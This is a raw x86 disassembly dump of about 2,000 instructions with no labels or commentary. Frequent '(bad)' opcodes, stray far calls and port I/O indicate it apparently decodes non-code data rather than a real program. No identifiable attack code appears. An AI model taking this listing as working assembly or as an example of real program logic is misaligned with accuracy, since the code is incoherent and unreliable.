  690f71:	mov    ebp,0xbdb86616
  690f76:	push   0xdbd40caa
  690f7b:	fild   WORD PTR [eax]
  690f7d:	or     ch,BYTE PTR [eax]
  690f7f:	repz pop esp
  690f81:	(bad)  
  690f82:	cmp    esp,DWORD PTR ds:0x8575b34b
  690f88:	fs call 0x6079:0x5fd4fe0
  690f90:	xchg   BYTE PTR [ecx+edx*2],bh
  690f93:	fadd   DWORD PTR [ecx+0x58471043]
  690f99:	or     DWORD PTR [edx+ecx*4-0xdf85d8b],edi
  690fa0:	mov    edi,0xcd535c27
  690fa5:	pusha  
  690fa6:	aad    0xbd
  690fa8:	bound  edx,QWORD PTR [ebp-0x2e]
  690fab:	dec    esp
  690fac:	std    
  690fad:	add    al,0x3e
  690faf:	and    eax,0xf43300bb
  690fb4:	jno    0x690f9f
  690fb6:	repz cdq 
  690fb8:	je     0x690f4e
  690fba:	pushf  
  690fbb:	xchg   BYTE PTR ds:0x20e6979c,al
  690fc1:	sub    al,0xd0
  690fc3:	inc    eax
  690fc4:	or     DWORD PTR [ecx-0x1469711f],eax
  690fca:	mov    DWORD PTR [edi-0x70376474],ebx
  690fd0:	xchg   DWORD PTR [edx],ecx
  690fd2:	push   ebx
  690fd3:	jmp    0x690f88
  690fd5:	add    al,0xe3
  690fd7:	inc    edx
  690fd8:	mov    WORD PTR [esi-0x10],fs
  690fdb:	xor    al,0xd8
  690fdd:	push   esp
  690fde:	fnstenv [ecx-0x70bf7122]
  690fe4:	test   DWORD PTR [edi+0x4f72f6a6],ebx
  690fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690feb:	out    dx,al
  690fec:	je     0x690fb2
  690fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690fef:	dec    esp
  690ff0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  690ff2:	push   ds
  690ff3:	inc    ecx
  690ff4:	int    0xf9
  690ff6:	out    0xb8,al
  690ff8:	(bad)  
  690ff9:	aad    0xc2
  690ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690ffc:	cmp    DWORD PTR [edi+0xafe0799],esi
  691002:	sub    DWORD PTR [edx+0x3194a650],0x2c111e5e
  69100c:	jl     0x691030
  69100e:	jge    0x690fe4
  691010:	bound  ebp,QWORD PTR [esi+0x57]
  691013:	aaa    
  691014:	lahf   
  691015:	xchg   ebx,eax
  691016:	retf   
  691017:	enter  0x1e85,0xea
  69101b:	xchg   esp,eax
  69101c:	rcl    DWORD PTR [esi],0x6b
  69101f:	cli    
  691020:	daa    
  691021:	adc    ecx,DWORD PTR [ebx+0x59e9ddd9]
  691027:	int    0x2b
  691029:	jmp    0xd7c87011
  69102e:	push   esp
  69102f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691030:	cmp    cl,dl
  691032:	mov    eax,ds:0xbfe29509
  691037:	mov    esi,0xf3185253
  69103c:	and    eax,DWORD PTR [esp+eax*2+0x7631c612]
  691043:	int3   
  691044:	aaa    
  691045:	or     ebp,ebx
  691047:	dec    esi
  691048:	(bad)  
  69104a:	push   eax
  69104b:	fs es push eax
  69104e:	in     al,dx
  69104f:	retf   0x3dcf
  691052:	push   edx
  691053:	in     al,0x52
  691055:	retf   
  691056:	xor    al,0xdb
  691058:	push   eax
  691059:	je     0x691000
  69105b:	lock mov BYTE PTR [edx-0x6df2b9d2],dl
  691062:	addr16 mov ch,0xac
  691065:	inc    ebp
  691066:	test   al,0x18
  691068:	pop    eax
  691069:	push   0x5973b005
  69106e:	fs inc ebx
  691070:	cmp    ah,BYTE PTR [ebx]
  691072:	mov    edx,0x32ea3d18
  691077:	loop   0x6910ab
  691079:	stos   BYTE PTR es:[edi],al
  69107a:	(bad)  
  69107d:	outs   dx,BYTE PTR ds:[esi]
  69107e:	fcom   DWORD PTR [edx+0x76]
  691081:	loope  0x6910c7
  691083:	loop   0x691026
  691085:	inc    ebp
  691086:	in     eax,0x9d
  691088:	shl    BYTE PTR [eax],0x1f
  69108b:	mov    cl,0xcf
  69108d:	xor    BYTE PTR [edi-0xf920f3f],0x90
  691094:	sar    dh,cl
  691096:	xchg   ebp,eax
  691097:	jmp    0xadd2:0x181a27b2
  69109e:	mov    esp,0xff7e72a3
  6910a3:	dec    ebx
  6910a4:	jg     0x6910ac
  6910a6:	sbb    ch,al
  6910a8:	sbb    esi,ebp
  6910aa:	pop    ss
  6910ab:	jns    0x6910f4
  6910ad:	or     al,0xce
  6910af:	stos   DWORD PTR es:[edi],eax
  6910b0:	popa   
  6910b1:	push   ss
  6910b2:	ja     0x691131
  6910b4:	imul   eax,DWORD PTR [eax-0x18],0x17
  6910b8:	mov    ch,0x84
  6910ba:	out    dx,eax
  6910bb:	xchg   ebp,eax
  6910bc:	push   ss
  6910bd:	fs hlt 
  6910bf:	daa    
  6910c0:	lods   eax,DWORD PTR ds:[esi]
  6910c1:	outs   dx,BYTE PTR ds:[esi]
  6910c2:	sar    BYTE PTR [edx+0x4d],cl
  6910c5:	sbb    eax,0xf9d7cbfb
  6910ca:	retf   0x6363
  6910cd:	cmp    ebp,0xc3c2091b
  6910d3:	sbb    eax,DWORD PTR [edi+0x3d4c60be]
  6910d9:	mov    bl,0x2a
  6910db:	mov    WORD PTR [esi],?
  6910dd:	les    edi,FWORD PTR [ebx+0x4bc1aad6]
  6910e3:	cmp    BYTE PTR [ecx-0x24cf19d0],0x5
  6910ea:	pop    ds
  6910eb:	sub    ecx,eax
  6910ed:	icebp  
  6910ee:	xchg   edi,eax
  6910ef:	xor    edi,DWORD PTR [ecx+0x75c861ed]
  6910f5:	lock or ecx,edx
  6910f8:	scas   al,BYTE PTR es:[edi]
  6910f9:	ret    0xa16f
  6910fc:	sub    BYTE PTR [edi],al
  6910fe:	add    ebx,DWORD PTR [ebp-0x31]
  691101:	inc    esp
  691102:	pop    ebp
  691103:	outs   dx,DWORD PTR ds:[esi]
  691104:	test   BYTE PTR [eax-0x56e01926],al
  69110a:	je     0x6910ea
  69110c:	ja     0x6910ad
  69110e:	rol    BYTE PTR [ebx-0x2d],1
  691111:	(bad)  
  691112:	(bad)  
  691113:	jno    0x69117f
  691115:	add    eax,0x8bfea12e
  69111a:	or     eax,edx
  69111c:	bnd jle 0x691126
  69111f:	or     ah,BYTE PTR [edi]
  691121:	xor    esi,DWORD PTR [edi-0x1f]
  691124:	arpl   WORD PTR [ecx+0x23528037],bx
  69112a:	neg    BYTE PTR ds:0xed39b375
  691130:	cmp    ch,BYTE PTR [edi]
  691132:	mov    ecx,0x43ff6705
  691137:	mov    ebx,0xd776f57d
  69113c:	push   esp
  69113d:	stc    
  69113e:	(bad)  
  69113f:	retf   
  691140:	jne    0x691107
  691142:	jge    0x691199
  691144:	jb     0x69117e
  691146:	mov    bl,0xf3
  691148:	xchg   ecx,eax
  691149:	push   eax
  69114a:	cmp    dl,BYTE PTR [eax+0x35]
  69114d:	mov    ch,0x67
  69114f:	dec    edx
  691150:	sub    esi,eax
  691152:	sbb    BYTE PTR [esi+ebp*1],ah
  691155:	cmp    BYTE PTR [eax],cl
  691157:	mov    cl,0x52
  691159:	inc    eax
  69115a:	je     0x691189
  69115c:	les    edi,FWORD PTR [ebp-0x47]
  69115f:	leave  
  691160:	jecxz  0x69118e
  691162:	outs   dx,DWORD PTR ds:[esi]
  691163:	mov    ds:0xf069ed2c,eax
  691168:	leave  
  691169:	xchg   ecx,eax
  69116a:	or     ecx,0x78
  69116d:	out    dx,al
  69116e:	jno    0x69113c
  691170:	jl     0x69117c
  691172:	lods   eax,DWORD PTR ds:[esi]
  691173:	fidivr WORD PTR [edx+0x194b002]
  691179:	and    esi,ebp
  69117b:	fistp  QWORD PTR [eax+esi*4+0x0]
  69117f:	inc    BYTE PTR [bx+si+0x56d3]
  691184:	sbb    cl,BYTE PTR [ecx]
  691186:	fcomp  QWORD PTR [ebx]
  691188:	or     BYTE PTR [esp+edx*4],0x23
  69118c:	pop    esp
  69118d:	pop    edi
  69118e:	jno    0x69114e
  691190:	mov    ebx,0xe059347c
  691195:	fld    TBYTE PTR [edx]
  691197:	hlt    
  691198:	or     al,0xc9
  69119a:	jo     0x691217
  69119c:	dec    eax
  69119d:	inc    edx
  69119e:	push   0xffffffdf
  6911a0:	shl    ch,0xb7
  6911a3:	mov    al,ds:0x5d68f92f
  6911a8:	push   ecx
  6911a9:	dec    ecx
  6911aa:	jo     0x6911b3
  6911ac:	fs rcr cl,0x2b
  6911b0:	les    ebp,FWORD PTR [esi]
  6911b2:	call   0x3e45:0x107f9d45
  6911b9:	inc    eax
  6911ba:	sbb    ah,dh
  6911bc:	je     0x691229
  6911be:	(bad)  
  6911bf:	push   ss
  6911c0:	mov    esi,0x9fda72d8
  6911c5:	and    ebp,edi
  6911c7:	pushf  
  6911c8:	push   ds
  6911c9:	jp     0x69120e
  6911cb:	ficom  DWORD PTR [esi+0xf]
  6911ce:	or     eax,0x25324229
  6911d3:	dec    ebp
  6911d4:	loop   0x6911f1
  6911d6:	mov    al,ds:0xe9fcd767
  6911db:	rep outs dx,BYTE PTR ds:[esi]
  6911dd:	mov    ebx,0x3d327416
  6911e2:	push   eax
  6911e3:	ins    BYTE PTR es:[edi],dx
  6911e4:	das    
  6911e5:	clc    
  6911e6:	mov    dl,BYTE PTR [ebx-0x34]
  6911e9:	push   edi
  6911ea:	dec    esp
  6911eb:	(bad)  
  6911ec:	mov    dl,0x23
  6911ee:	mov    al,ds:0x10b4e647
  6911f3:	mov    esi,0x3f63022d
  6911f8:	frstor [ebx]
  6911fa:	adc    al,0xe9
  6911fc:	jns    0x6911a1
  6911fe:	ret    0xcad5
  691201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  691202:	popf   
  691203:	mov    ebp,0xb5904680
  691208:	inc    ebx
  691209:	jge    0x6911b5
  69120b:	sti    
  69120c:	xchg   ebp,eax
  69120d:	loop   0x6911db
  69120f:	popa   
  691210:	xchg   ebp,eax
  691211:	xchg   esp,eax
  691212:	dec    eax
  691213:	add    DWORD PTR [ecx+0x1c6146aa],eax
  691219:	ret    0xf1e8
  69121c:	add    ah,ch
  69121e:	mov    DWORD PTR [edi],ecx
  691220:	inc    ebx
  691221:	xchg   ebp,eax
  691222:	in     eax,dx
  691223:	cmp    cl,cl
  691225:	lods   eax,DWORD PTR ds:[esi]
  691226:	pop    ebp
  691227:	shl    ebp,cl
  691229:	out    0xc6,al
  69122b:	fucom  st(5)
  69122d:	mov    cl,BYTE PTR [esi-0x1c]
  691230:	mov    esi,0xa565ac66
  691235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691236:	mov    al,ch
  691238:	call   0xd3e3:0x9d5f807d
  69123f:	or     bl,dl
  691241:	hlt    
  691242:	inc    edi
  691243:	clc    
  691244:	call   0x8837:0xf894a553
  69124b:	mov    edx,0xcfa672e1
  691250:	out    0xb8,al
  691252:	add    esp,DWORD PTR [eax-0x2901d97c]
  691258:	jmp    0xd0254322
  69125d:	mov    DWORD PTR [esi+0x3f],ebx
  691260:	call   DWORD PTR [edi+0x6e]
  691263:	adc    eax,0x6cd0ce53
  691268:	gs stos BYTE PTR es:[edi],al
  69126a:	jno    0x691298
  69126c:	pop    esi
  69126d:	inc    eax
  69126e:	inc    ecx
  691270:	cmp    al,0x6b
  691272:	mov    ds:0x857aefff,eax
  691277:	inc    edx
  691278:	pushf  
  691279:	jbe    0x691250
  69127b:	scas   eax,DWORD PTR es:[edi]
  69127c:	rol    bh,cl
  69127e:	or     BYTE PTR [eax+0xdfcc2ee],ch
  691284:	ins    BYTE PTR es:[edi],dx
  691285:	push   ecx
  691286:	cmp    BYTE PTR [edx-0x53],al
  691289:	gs sub DWORD PTR ds:[ebx+0x3978b57c],0x8b925aca
  691295:	mov    edx,0x686e0ab5
  69129a:	mov    edi,0xd90365e4
  69129f:	aam    0xd
  6912a1:	push   edx
  6912a2:	push   esi
  6912a3:	inc    ebp
  6912a4:	cmp    ah,al
  6912a6:	daa    
  6912a7:	(bad)  
  6912a8:	push   ecx
  6912a9:	gs inc edi
  6912ab:	icebp  
  6912ac:	ss push eax
  6912ae:	xchg   edx,eax
  6912af:	add    DWORD PTR [eax-0x24c721c0],eax
  6912b5:	and    BYTE PTR [ebx-0x36447883],0xb4
  6912bc:	sbb    DWORD PTR [edi+0x6c7db1c3],ecx
  6912c2:	leave  
  6912c3:	sbb    DWORD PTR [edi-0x4c],esi
  6912c6:	or     ebp,DWORD PTR [ebx+0x2e]
  6912c9:	lock pop esp
  6912cb:	jecxz  0x691303
  6912cd:	jmp    0x4b102bcd
  6912d2:	cmp    al,0x4d
  6912d4:	inc    ebx
  6912d5:	add    dl,BYTE PTR [edi]
  6912d7:	int3   
  6912d8:	clc    
  6912d9:	push   0xffffffc8
  6912db:	inc    ecx
  6912dc:	leave  
  6912dd:	push   ds
  6912de:	sub    BYTE PTR [esi-0x1b111c27],bl
  6912e4:	ss (bad) 
  6912e6:	loop   0x69131a
  6912e8:	lds    ebx,FWORD PTR ss:[ebp+0x5284c446]
  6912ef:	sbb    al,0x6e
  6912f1:	xchg   ecx,eax
  6912f2:	hlt    
  6912f3:	pop    ebx
  6912f4:	mov    ah,0x62
  6912f7:	and    BYTE PTR [edx],cl
  6912f9:	data16 fcmovnu st,st(4)
  6912fc:	enter  0xca27,0x23
  691300:	loopne 0x6912be
  691302:	scas   al,BYTE PTR es:[edi]
  691303:	lods   eax,DWORD PTR ds:[esi]
  691304:	adc    ebp,ecx
  691306:	jo     0x6912d6
  691308:	inc    ecx
  691309:	push   edi
  69130a:	pop    ebp
  69130b:	jmp    0xebedea8f
  691310:	stc    
  691311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691312:	xlat   BYTE PTR ds:[ebx]
  691313:	outs   dx,BYTE PTR ds:[esi]
  691314:	push   es
  691315:	out    0xf4,eax
  691317:	xor    al,0x1d
  691319:	aad    0x24
  69131b:	neg    BYTE PTR [ebx-0x12]
  69131e:	add    bh,bl
  691320:	dec    edx
  691321:	pop    ss
  691322:	ins    BYTE PTR es:[edi],dx
  691323:	fcomp  DWORD PTR [edx-0x4b]
  691326:	pop    edi
  691327:	add    BYTE PTR [eax+0x3e8f2d5f],cl
  69132d:	enter  0x2cf5,0xb8
  691331:	pop    edx
  691332:	pop    ds
  691333:	shl    DWORD PTR [ebx+eiz*4+0x58],0x61
  691338:	push   0xc070537
  69133d:	xchg   ah,cl
  69133f:	xor    ebx,DWORD PTR ds:0x37f1e37e
  691345:	xchg   esi,eax
  691346:	cmp    DWORD PTR [edx+0x18],0xffffffc3
  69134a:	xchg   ebp,eax
  69134b:	sub    esi,esp
  69134d:	jmp    0xa11fd238
  691352:	mov    al,BYTE PTR [edx]
  691354:	ins    BYTE PTR es:[edi],dx
  691355:	test   BYTE PTR [ebp+ebp*2+0xe],ah
  691359:	jmp    0x6913bd
  69135b:	dec    ebx
  69135c:	leave  
  69135d:	and    al,0x8c
  69135f:	cmp    al,0x85
  691361:	xlat   BYTE PTR ds:[ebx]
  691362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  691363:	cmp    esi,ecx
  691365:	ror    DWORD PTR [ecx-0x67e65be7],cl
  69136b:	cmp    bl,dl
  69136d:	in     al,dx
  69136e:	xchg   ebx,eax
  69136f:	out    dx,eax
  691370:	pop    ebp
  691371:	adc    al,0x8
  691373:	mov    ds:0x2e1c4a77,al
  691378:	div    BYTE PTR [ecx-0x7595e7ac]
  69137e:	jns    0x69139a
  691380:	repnz xchg ecx,eax
  691382:	aam    0xca
  691384:	lds    edx,FWORD PTR [ecx]
  691386:	xchg   edx,eax
  691387:	mov    WORD PTR [esi+edi*4-0x613bd602],gs
  69138e:	in     eax,0xf5
  691390:	xor    DWORD PTR [edi+0x69dff088],0x52
  691397:	dec    esi
  691398:	fidiv  WORD PTR [edi+0x11]
  69139b:	dec    ecx
  69139c:	push   ecx
  69139d:	pop    edx
  69139e:	add    eax,0xc5b33447
  6913a3:	cmc    
  6913a4:	mov    al,ds:0x7401abde
  6913a9:	pop    edi
  6913aa:	sub    dl,cl
  6913ac:	daa    
  6913ad:	inc    ecx
  6913ae:	xor    BYTE PTR [edx+0x2abafa35],0xea
  6913b5:	push   ebp
  6913b6:	push   esi
  6913b7:	inc    ecx
  6913b8:	sar    DWORD PTR [ecx-0x34947b99],1
  6913be:	sahf   
  6913bf:	mov    dh,0x79
  6913c1:	jnp    0x6913ba
  6913c3:	xchg   DWORD PTR [eax-0x49ae04c6],edx
  6913c9:	xor    eax,DWORD PTR [ebp-0x2a4f87b8]
  6913cf:	(bad)  
  6913d0:	loopne 0x6913a1
  6913d2:	adc    DWORD PTR [ebp-0x24d2696],esi
  6913d8:	enter  0x573f,0xd7
  6913dc:	pushf  
  6913dd:	sub    al,0x7b
  6913df:	ficomp WORD PTR [eax+0x6b]
  6913e2:	push   ss
  6913e3:	aam    0x1a
  6913e5:	and    eax,0xe2ec218c
  6913ea:	or     esi,esi
  6913ec:	outs   dx,DWORD PTR ds:[esi]
  6913ed:	xchg   DWORD PTR [ecx-0x70],esp
  6913f0:	sub    BYTE PTR [ebx-0x2d],ah
  6913f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6913f4:	dec    ecx
  6913f5:	scas   al,BYTE PTR es:[edi]
  6913f6:	shl    BYTE PTR [edx-0x77],0xe1
  6913fa:	call   0x7e31aed0
  6913ff:	and    ebp,DWORD PTR ds:0x917830c4
  691405:	iret   
  691406:	push   ss
  691407:	(bad)  
  691408:	loopne 0x6913bc
  69140a:	push   esi
  69140b:	sub    DWORD PTR [eax+esi*2+0x36],ecx
  69140f:	adc    DWORD PTR [ecx],esp
  691411:	outs   dx,DWORD PTR ds:[esi]
  691412:	mov    esi,DWORD PTR [esi]
  691414:	gs das 
  691416:	jl     0x6913ed
  691418:	cmp    ah,dh
  69141a:	inc    esp
  69141b:	mov    BYTE PTR [esi+0xd62e45f],ah
  691421:	paddq  mm2,QWORD PTR [edx-0x1e]
  691425:	repz adc esp,DWORD PTR [edi+edx*8-0x4e0bfb48]
  69142d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69142e:	ds loope 0x691425
  691431:	jno    0x69140a
  691433:	inc    eax
  691434:	add    DWORD PTR ds:0x4e478926,ebp
  69143a:	pop    es
  69143b:	push   ebx
  69143c:	int3   
  69143d:	push   esi
  69143e:	cdq    
  69143f:	dec    edi
  691440:	cld    
  691441:	mov    ah,0x5c
  691443:	and    ah,al
  691445:	int    0x5a
  691447:	loop   0x6913e7
  691449:	sub    eax,0xb36f712d
  69144e:	adc    eax,0xb499bff0
  691453:	push   ebp
  691454:	das    
  691455:	add    DWORD PTR [ebp-0x3fa3341b],0x16a1237d
  69145f:	inc    ecx
  691460:	pop    ecx
  691461:	xchg   esi,eax
  691462:	and    BYTE PTR ds:0x1d702ea2,dl
  691468:	pmaxsw mm1,QWORD PTR [edi+eiz*2]
  69146c:	stos   BYTE PTR es:[edi],al
  69146d:	inc    edi
  69146e:	rcr    cl,0xf7
  691471:	cmp    dh,BYTE PTR [esi+0xc5c1f6c]
  691477:	pusha  
  691478:	add    BYTE PTR [ecx-0x4d],cl
  69147b:	push   esi
  69147c:	push   cs
  69147d:	test   DWORD PTR [ebx],esp
  69147f:	mov    ebx,0x1dc7370d
  691484:	add    DWORD PTR [ebx],edx
  691486:	xor    al,0xe8
  691488:	mov    al,ds:0xae0bdb30
  69148d:	dec    ecx
  69148e:	out    0x52,al
  691490:	push   ds
  691491:	and    ch,BYTE PTR [ebx-0x2e011da5]
  691497:	in     eax,0x55
  691499:	mov    ebp,0xd133c29d
  69149e:	sub    al,0x45
  6914a0:	sub    esp,DWORD PTR [ecx+ebp*1-0xc01c68]
  6914a7:	push   ebx
  6914a8:	mov    esi,0x2e7ad347
  6914ad:	mov    esi,0x80009763
  6914b2:	push   esi
  6914b3:	pop    eax
  6914b4:	pop    ds
  6914b5:	jmp    0x75303191
  6914ba:	cld    
  6914bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6914bc:	adc    DWORD PTR [esi-0x6c11d109],ecx
  6914c2:	mov    ah,0x1b
  6914c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6914c5:	not    ecx
  6914c7:	or     bh,0xbf
  6914ca:	mov    al,ds:0x80c975cf
  6914cf:	in     eax,0xba
  6914d1:	pop    ss
  6914d2:	sub    al,0x7d
  6914d4:	in     eax,dx
  6914d5:	cli    
  6914d6:	stos   BYTE PTR es:[edi],al
  6914d7:	sbb    DWORD PTR [eax-0x7081ac9d],ebx
  6914dd:	call   DWORD PTR [esi]
  6914df:	jmp    0x691508
  6914e1:	scas   eax,DWORD PTR es:[edi]
  6914e2:	js     0x6914c1
  6914e4:	add    ch,dl
  6914e6:	and    al,0xa3
  6914e8:	jb     0x691533
  6914ea:	mov    edx,DWORD PTR [edx+0x3f89f74f]
  6914f0:	jmp    0xa84e:0x53fc37c1
  6914f7:	ja     0x691494
  6914f9:	daa    
  6914fa:	push   ebp
  6914fb:	stos   DWORD PTR es:[edi],eax
  6914fc:	lods   eax,DWORD PTR ds:[esi]
  6914fd:	test   cl,bh
  6914ff:	sub    edi,DWORD PTR [esi+0x33bd8035]
  691505:	jl     0x6914b6
  691507:	mov    edi,0xce3c3ba7
  69150c:	cdq    
  69150d:	cwde   
  69150e:	push   edi
  69150f:	sbb    ch,BYTE PTR [esi]
  691511:	(bad)  
  691512:	jnp    0x69157b
  691514:	or     BYTE PTR [ebx+0x746b54f2],dl
  69151a:	dec    esi
  69151b:	cs popf 
  69151d:	lods   al,BYTE PTR ds:[esi]
  69151e:	pop    ebp
  69151f:	pop    esi
  691520:	adc    BYTE PTR ds:0x238005fb,0xaf
  691527:	out    0xd0,al
  691529:	adc    DWORD PTR ds:0xb5f11d05,esp
  69152f:	jne    0x6914d5
  691531:	ins    BYTE PTR es:[edi],dx
  691532:	jg     0x6914c7
  691534:	xor    BYTE PTR [ebp+0x7fb10034],dh
  69153a:	dec    esp
  69153b:	test   edi,0xc5e50ab6
  691541:	add    edi,DWORD PTR [ebx]
  691543:	dec    ebx
  691544:	pop    ss
  691545:	dec    eax
  691546:	and    BYTE PTR [edi+0x93c9ce3],0x67
  69154d:	or     DWORD PTR [ecx-0x8],ebp
  691550:	ret    
  691551:	daa    
  691552:	jp     0x6914e4
  691554:	repnz inc ecx
  691556:	push   edx
  691557:	daa    
  691558:	xlat   BYTE PTR ds:[ebx]
  691559:	jmp    0x5577:0x21d73381
  691560:	outs   dx,DWORD PTR ds:[esi]
  691561:	mov    ds:0xadbba48c,al
  691566:	xor    ebx,edi
  691568:	push   ss
  691569:	mov    bl,0xa4
  69156b:	mov    ss,WORD PTR [edi+0x6842c5cf]
  691571:	stos   DWORD PTR es:[edi],eax
  691572:	out    0x23,eax
  691574:	or     DWORD PTR [ecx-0x32cb5b2c],0x4b
  69157b:	xor    ebx,edx
  69157d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69157e:	dec    ebp
  69157f:	xor    eax,0x140c9a31
  691584:	imul   ebx,DWORD PTR [ecx+0x5e0115a0],0x6b2b4c41
  69158e:	mov    ebx,0x9e31dc0d
  691593:	fwait
  691594:	jb     0x69159a
  691596:	sbb    al,0x6c
  691598:	inc    ebp
  691599:	sti    
  69159a:	fimul  DWORD PTR [edi-0x75]
  69159d:	ret    
  69159e:	lahf   
  69159f:	xlat   BYTE PTR ds:[ebx]
  6915a0:	cwde   
  6915a1:	push   ecx
  6915a2:	sub    DWORD PTR [esi-0x1b],edx
  6915a5:	leave  
  6915a6:	or     edi,esi
  6915a8:	jnp    0x6915af
  6915aa:	ficomp DWORD PTR [ecx-0x4e]
  6915ad:	xchg   edx,eax
  6915ae:	sub    DWORD PTR [ebx-0x339812dc],esp
  6915b4:	ret    0xdc8f
  6915b7:	cmp    ch,bl
  6915b9:	sbb    al,0xf7
  6915bb:	or     DWORD PTR [esi],edx
  6915bd:	(bad)  
  6915be:	gs loop 0x691581
  6915c1:	mov    ch,0x63
  6915c3:	add    DWORD PTR [eax-0x2886348a],ecx
  6915c9:	mov    dl,0xd6
  6915cb:	aaa    
  6915cc:	mov    esi,?
  6915ce:	and    BYTE PTR [ecx],ch
  6915d0:	push   ds
  6915d1:	cmp    al,0xc
  6915d3:	in     al,dx
  6915d4:	lds    ebx,FWORD PTR [edi]
  6915d6:	test   BYTE PTR [edi+0x2774466d],dh
  6915dc:	into   
  6915dd:	mov    ch,0x8e
  6915df:	sbb    al,0x2f
  6915e1:	inc    edi
  6915e2:	pop    esi
  6915e3:	sbb    al,BYTE PTR [ebx]
  6915e5:	sbb    eax,0xdc09394c
  6915ea:	push   es
  6915eb:	mov    dl,0x25
  6915ed:	leave  
  6915ee:	icebp  
  6915ef:	fcom   QWORD PTR [edx]
  6915f1:	aaa    
  6915f2:	or     DWORD PTR [esi-0x39],eax
  6915f5:	add    BYTE PTR [ebp+0x68],cl
  6915f8:	dec    ecx
  6915f9:	repnz mov esp,0xe08b9ac5
  6915ff:	or     BYTE PTR [eax-0x34],ah
  691602:	(bad)  [eax+0x3bbd9b91]
  691608:	pop    es
  691609:	or     ecx,0xffffffab
  69160c:	cmp    ebp,esp
  69160e:	shr    DWORD PTR [esi+0x6c7731ee],cl
  691614:	dec    ecx
  691615:	frndint 
  691617:	popf   
  691618:	cmp    al,bh
  69161a:	inc    esp
  69161b:	sahf   
  69161c:	cmc    
  69161d:	jae    0x6915e8
  69161f:	xchg   esp,eax
  691620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691621:	out    0xe8,al
  691623:	bound  esp,QWORD PTR [edx+ebp*1+0xe]
  691627:	repz into 
  691629:	mov    dl,0x7b
  69162b:	rol    DWORD PTR [ebx-0x6f],1
  69162e:	sahf   
  69162f:	fcom   st(2)
  691631:	test   BYTE PTR [ecx+0x597669ae],bl
  691637:	(bad)  
  691638:	(bad)  
  691639:	mov    cl,0x65
  69163b:	push   ebp
  69163d:	inc    esp
  69163e:	or     eax,0x921c9981
  691643:	hlt    
  691644:	mov    esi,ebx
  691646:	dec    edx
  691647:	dec    eax
  691648:	(bad)  [ecx+0x2e]
  69164b:	test   BYTE PTR [ebx-0xd8645e6],dl
  691651:	pop    esi
  691652:	test   al,0x60
  691654:	call   0x6a414af4
  691659:	sub    eax,0x44066fac
  69165e:	fwait
  69165f:	push   0x447ffaa6
  691664:	inc    ebp
  691665:	stos   BYTE PTR es:[edi],al
  691666:	arpl   WORD PTR [edi],dx
  691668:	pop    ebp
  691669:	pop    ebx
  69166a:	xor    al,0x5e
  69166c:	gs mov cl,0x3f
  69166f:	das    
  691670:	fnsave [ecx+0x76]
  691673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  691674:	jns    0x69167b
  691676:	pop    ebp
  691677:	xor    al,0x70
  691679:	xlat   BYTE PTR ds:[ebx]
  69167a:	xchg   ecx,eax
  69167b:	into   
  69167c:	push   edx
  69167d:	(bad)  
  69167e:	mov    ds:0x1cac11aa,al
  691683:	add    BYTE PTR [eax-0x51],dl
  691686:	pop    edx
  691687:	(bad)  
  691688:	clc    
  691689:	sub    bh,BYTE PTR [edx+0x6e77c47e]
  69168f:	mov    bl,0xe5
  691691:	or     al,0x2
  691693:	and    BYTE PTR [esi],dl
  691695:	push   esp
  691696:	jl     0x691637
  691698:	iret   
  691699:	dec    ebx
  69169a:	pop    ds
  69169b:	mov    bl,0x27
  69169d:	mov    esp,0xc61d7f87
  6916a2:	xor    ah,bh
  6916a4:	mov    esi,0xcd5ac664
  6916a9:	sbb    eax,0x80dc3b20
  6916ae:	and    cl,ah
  6916b0:	repnz fimul DWORD PTR ds:0x87635d21
  6916b7:	sbb    eax,0x3040e2f8
  6916bc:	clc    
  6916bd:	mov    cl,0xe
  6916bf:	das    
  6916c0:	cs sahf 
  6916c2:	sub    al,0x9e
  6916c4:	push   ebx
  6916c5:	sbb    ebx,DWORD PTR [eax-0x7f7a3fe]
  6916cb:	lahf   
  6916cc:	in     eax,dx
  6916cd:	cmp    ah,BYTE PTR [esi-0x2847e33a]
  6916d3:	lds    edx,FWORD PTR [ebx]
  6916d5:	xor    edi,edi
  6916d7:	bnd ja 0x691689
  6916da:	add    ch,al
  6916dc:	and    al,0xfc
  6916de:	(bad)  
  6916df:	pop    eax
  6916e0:	mov    edx,0x251ed36e
  6916e5:	arpl   WORD PTR [ecx+ebx*2+0x5a3a9048],ax
  6916ec:	out    dx,eax
  6916ed:	xor    eax,0x2a6347dd
  6916f2:	jmp    0x691759
  6916f4:	in     al,0x41
  6916f6:	sbb    al,0x64
  6916f8:	arpl   dx,di
  6916fa:	push   0x7c05308f
  6916ff:	sub    eax,0x1026392a
  691704:	xor    ebx,edi
  691706:	mov    edi,esp
  691708:	inc    esi
  691709:	xor    al,0x48
  69170b:	fld    DWORD PTR [ecx]
  69170d:	xor    eax,esi
  69170f:	sub    eax,0xeae6b088
  691714:	std    
  691715:	dec    eax
  691716:	add    DWORD PTR [edx+0xe],0xffffffae
  69171a:	jo     0x69175f
  69171c:	mov    eax,edi
  69171e:	ja     0x69170e
  691720:	cmp    DWORD PTR [edi-0x4dc0cfad],edi
  691726:	rcr    BYTE PTR [eax],cl
  691728:	aam    0x56
  69172a:	dec    eax
  69172b:	adc    eax,0xa93b577
  691730:	or     edi,DWORD PTR [ebx]
  691732:	pop    esi
  691733:	sbb    al,0xed
  691735:	xor    DWORD PTR [edx+ecx*2],0xffffffba
  691739:	dec    ecx
  69173a:	mov    ecx,0xea40fc73
  69173f:	push   ecx
  691740:	rcr    BYTE PTR [edi+0x6c163819],1
  691746:	pop    es
  691747:	iret   
